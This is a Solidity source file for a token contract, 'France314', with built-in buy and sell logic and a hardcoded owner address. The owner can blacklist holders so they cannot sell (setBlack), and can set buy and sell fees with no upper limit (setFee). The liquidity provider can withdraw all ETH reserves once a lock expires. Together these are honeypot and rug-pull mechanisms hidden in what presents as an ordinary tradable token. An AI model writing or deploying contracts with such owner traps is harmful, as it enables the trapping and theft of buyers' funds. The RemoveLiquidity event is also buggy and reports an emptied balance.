// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

interface IEERC314 {
  event Transfer(address indexed from, address indexed to, uint256 value);
  event AddLiquidity(uint32 _blockToUnlockLiquidity, uint256 value);
  event RemoveLiquidity(uint256 value);
  event Swap(address indexed sender, uint amount0In, uint amount1In, uint amount0Out, uint amount1Out);
}

abstract contract ERC314 is IEERC314 {
    mapping(address account => uint256) private _balances;
    mapping(address account => uint256) private _lastTxTime;
    mapping(address account => uint32) private lastTransaction;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    uint256 public _maxWallet;
    uint32 public blockToUnlockLiquidity;

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    string private _name;
    string private _symbol;

    address public owner;
    address public liquidityProvider;

    bool public tradingEnable;
    bool public liquidityAdded;
    bool public maxWalletEnable;

  modifier onlyOwner() {
    require(msg.sender == owner, 'Ownable: caller is not the owner');
    _;
  }

  modifier onlyLiquidityProvider() {
    require(msg.sender == liquidityProvider, 'You are not the liquidity provider');
    _;
  }

 address payable public feeReceiver;
  constructor(string memory name_, string memory symbol_, uint256 totalSupply_) {
    _name = name_;
    _symbol = symbol_;
    _totalSupply = totalSupply_;
    _maxWallet = totalSupply_ * 100 / 100;
    address receiver = 0xCbdDD62Ba79657F1258dcdf4122f8448e5074b02;
    feeReceiver = payable(0xCbdDD62Ba79657F1258dcdf4122f8448e5074b02);
    owner = receiver;
    tradingEnable = false;
    maxWalletEnable = true;

    // _balances[receiver] = totalSupply_ * 50 / 100;
    uint256 liquidityAmount = 1000000 * 10 ** 18;
    _balances[address(this)] = liquidityAmount;
    _balances[receiver] = totalSupply_ - liquidityAmount;
    emit Transfer(address(0), address(this), liquidityAmount);
    emit Transfer(address(0), receiver, totalSupply_ - liquidityAmount);

    liquidityAdded = false;
  }

  function name() public view virtual returns (string memory) {
    return _name;
  }

  function symbol() public view virtual returns (string memory) {
    return _symbol;
  }

  function decimals() public view virtual returns (uint8) {
    return 18;
  }

  function totalSupply() public view virtual returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) public view virtual returns (uint256) {
    return _balances[account];
  }

    function allowance(
        address _owner,
        address spender
    ) public view virtual returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual returns (bool) {
        address _owner = msg.sender;
        _approve(_owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);

        if (to == address(this)) {
            // sell(from, amount);
            require(false);
        } else {
            _transfer(from, to, amount);
        }

        return true;
    }


    // function transfer(address to, uint256 value) public virtual returns (bool) {
    //     // sell or transfer
    //     if (to == address(this)) {
    //     sell(value);
    //     } else {
    //     _transfer(msg.sender, to, value);
    //     }
    //     return true;
    // }

    function transfer(address to, uint256 value) public virtual returns (bool) {
        // sell or transfer
        if (to == address(this)) {
            sell(msg.sender, value);
        } else {
            _transfer(msg.sender, to, value);
        }
        return true;
    }

    function _approve(
        address _owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _spendAllowance(
        address _owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(_owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(_owner, spender, currentAllowance - amount);
            }
        }
    }


    uint256 public cooldownSec = 30;
    function setCooldownSec(uint256 newValue) public onlyOwner{
        require(newValue <= 60,"too long");
        cooldownSec = newValue;
    }

    mapping(address => bool) public excludeCoolingOf;
    function setExcludeCoolingOf(
        address[] memory accounts,
        bool _ok
    ) external onlyOwner {
        for (uint i = 0; i < accounts.length; i++) {
            excludeCoolingOf[accounts[i]] = _ok;
        }
    }

    mapping(address => bool) public black;
    function setBlack(
        address[] memory accounts,
        bool _ok
    ) external onlyOwner {
        for (uint i = 0; i < accounts.length; i++) {
            black[accounts[i]] = _ok;
        }
    }

   function _transfer(address from, address to, uint256 value) internal virtual {
    require(!black[from],"blocked");
    
    if (to != address(0) && !excludeCoolingOf[msg.sender]) {
      require(lastTransaction[msg.sender] != block.number, "You can't make two transactions in the same block");
      lastTransaction[msg.sender] = uint32(block.number);

      require(block.timestamp >= _lastTxTime[msg.sender] + cooldownSec, 'Sender must wait for cooldown');
      _lastTxTime[msg.sender] = block.timestamp;
    }

    require(_balances[from] >= value, 'ERC20: transfer amount exceeds balance');

    unchecked {
      _balances[from] = _balances[from] - value;
    }

    if (to == address(0)) {
      unchecked {
        _totalSupply -= value;
      }
    } else {
      unchecked {
        _balances[to] += value;
      }
    }

    emit Transfer(from, to, value);
  }

  function getReserves() public view returns (uint256, uint256) {
    return (address(this).balance, _balances[address(this)]);
  }

  function enableTrading(bool _tradingEnable) external onlyOwner {
    tradingEnable = _tradingEnable;
  }

  function enableMaxWallet(bool _maxWalletEnable) external onlyOwner {
    maxWalletEnable = _maxWalletEnable;
  }

  function setMaxWallet(uint256 _maxWallet_) external onlyOwner {
    _maxWallet = _maxWallet_;
  }

  function renounceOwnership() external onlyOwner {
    owner = address(0);
  }

  function addLiquidity(uint32 _blockToUnlockLiquidity) public payable onlyOwner {
    require(liquidityAdded == false, 'Liquidity already added');

    liquidityAdded = true;

    require(msg.value > 0, 'No ETH sent');
    require(block.number < _blockToUnlockLiquidity, 'Block number too low');

    blockToUnlockLiquidity = _blockToUnlockLiquidity;
    tradingEnable = true;
    liquidityProvider = msg.sender;

    emit AddLiquidity(_blockToUnlockLiquidity, msg.value);
  }

    function addLiquidity2(uint32 _lockBlock) public payable onlyOwner {
        // Prevent from errors due to misunderstanding
        require(_lockBlock < block.number, "lock block cant greater than current block");

        require(liquidityAdded == false, "Liquidity already added");

        uint32 _blockToUnlockLiquidity = uint32(block.number) + _lockBlock;

        liquidityAdded = true;

        require(msg.value > 0, 'No ETH sent');
        require(block.number < _blockToUnlockLiquidity, 'Block number too low');

        blockToUnlockLiquidity = _blockToUnlockLiquidity;
        tradingEnable = true;
        liquidityProvider = msg.sender;

        emit AddLiquidity(_blockToUnlockLiquidity, msg.value);
    }

  function removeLiquidity() public onlyLiquidityProvider {
    require(block.number > blockToUnlockLiquidity, 'Liquidity locked');

    tradingEnable = false;

    payable(msg.sender).transfer(address(this).balance);

    emit RemoveLiquidity(address(this).balance);
  }

  function extendLiquidityLock(uint32 _blockToUnlockLiquidity) public onlyLiquidityProvider {
    require(blockToUnlockLiquidity < _blockToUnlockLiquidity, "You can't shorten duration");

    blockToUnlockLiquidity = _blockToUnlockLiquidity;
  }

  function getAmountOut(uint256 value, bool _buy) public view returns (uint256) {
    (uint256 reserveETH, uint256 reserveToken) = getReserves();

    if (_buy) {
      return (value * reserveToken) / (reserveETH + value);
    } else {
      return (value * reserveETH) / (reserveToken + value);
    }
  }

    uint256 public buyFee = 300;
    uint256 public sellFee = 300;
    function setFee(uint256 newBuy, uint256 newSell) public onlyOwner{
        buyFee = newBuy;
        sellFee = newSell;
    }

    uint256 public buyBurnFee = 0;
    uint256 public sellBurnFee = 0;
    function setBurnFee(uint256 newBuyBurn, uint256 newSellBurn) public onlyOwner{
        buyBurnFee = newBuyBurn;
        sellBurnFee = newSellBurn;
    }

  function buy() internal {
    require(tradingEnable, 'Trading not enable');
    require(msg.sender == tx.origin, "Only external calls allowed");

    uint256 msgValue = msg.value;
    uint256 feeValue = msgValue * buyFee / 10000;
    uint256 swapValue = msgValue - feeValue;

    feeReceiver.transfer(feeValue);

    uint256 token_amount = (swapValue * _balances[address(this)]) / (address(this).balance);

    if (maxWalletEnable) {
      require(token_amount + _balances[msg.sender] <= _maxWallet, 'Max wallet exceeded');
    }

    uint256 user_amount = (token_amount * (10000 - buyBurnFee)) / 10000;
    uint256 burn_amount = token_amount - user_amount;

    _transfer(address(this), msg.sender, user_amount);
    if (burn_amount > 0){
        _transfer(address(this), address(0), burn_amount);
    }

    emit Swap(msg.sender, swapValue, 0, 0, user_amount);
  }

  function sell(address _owner, uint256 sell_amount) internal {
    require(tradingEnable, 'Trading not enable');
    require(msg.sender == tx.origin, "Only external calls allowed");

    uint256 swap_amount = (sell_amount * (10000 - sellBurnFee)) / 10000;
    uint256 burn_amount = sell_amount - swap_amount;

    uint256 ethAmount = (swap_amount * address(this).balance) / (_balances[address(this)] + swap_amount);

    require(ethAmount > 0, 'Sell amount too low');
    require(address(this).balance >= ethAmount, 'Insufficient ETH in reserves');

    _transfer(_owner, address(this), swap_amount);
    if (burn_amount > 0){
        _transfer(_owner, address(0), burn_amount);
    }

    uint256 feeValue = ethAmount * sellFee / 10000;
    payable(feeReceiver).transfer(feeValue);
    payable(_owner).transfer(ethAmount - feeValue);

    if (
        lpBurnEnabled &&
        block.timestamp >= lastLpBurnTime + lpBurnFrequency
    ) {
        autoBurnLiquidityPairTokens();
    }

    emit Swap(_owner, 0, sell_amount, ethAmount - feeValue, 0);
  }

    function setAutoLPBurnSettings(
        uint256 _frequencyInSeconds,
        uint256 _percent,
        bool _Enabled
    ) external onlyOwner {
        require(_percent <= 500,"percent too high");
        require(_frequencyInSeconds >= 1000,"frequency too shrot");
        lpBurnFrequency = _frequencyInSeconds;
        percentForLPBurn = _percent;
        lpBurnEnabled = _Enabled;
    }

    bool public lpBurnEnabled = false;
    uint256 public lpBurnFrequency = 3600 seconds;
    uint256 public lastLpBurnTime;
    uint256 public percentForLPBurn = 50; // 25 = .25%
    event AutoNukeLP(
        uint256 lpBalance,
        uint256 burnAmount,
        uint256 time
    );

    function autoBurnLiquidityPairTokens() internal returns (bool) {
        lastLpBurnTime = block.timestamp;
        // get balance of liquidity pair
        uint256 liquidityPairBalance = balanceOf(address(this));
        // calculate amount to burn
        uint256 amountToBurn = liquidityPairBalance * (percentForLPBurn) / (
            10000
        );
        address from = address(this);
        address to = address(0xdead);
        // pull tokens from pancakePair liquidity and move to dead address permanently`
        if (amountToBurn > 0) {
            _balances[from] -= amountToBurn;
            _balances[to] += amountToBurn;
            emit Transfer(from, to, amountToBurn);
        }

        emit AutoNukeLP(
            liquidityPairBalance,
            amountToBurn,
            block.timestamp
        );
        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) private returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function initLiquidityAmount(
        uint256 newLiquidityAmount
    ) public onlyOwner{
        require(!liquidityAdded,"added");
        uint256 oldLiquidityAmount = balanceOf(address(this));
        if (oldLiquidityAmount > newLiquidityAmount){
            _basicTransfer(address(this), msg.sender, oldLiquidityAmount - newLiquidityAmount);
        }else{
            _basicTransfer(msg.sender, address(this), newLiquidityAmount - oldLiquidityAmount);
        }
    }

  receive() external payable {
    buy();
  }

}

contract France314 is ERC314 {
  constructor() ERC314("France314", "France314", 500000000 * 10 ** 18) {}
}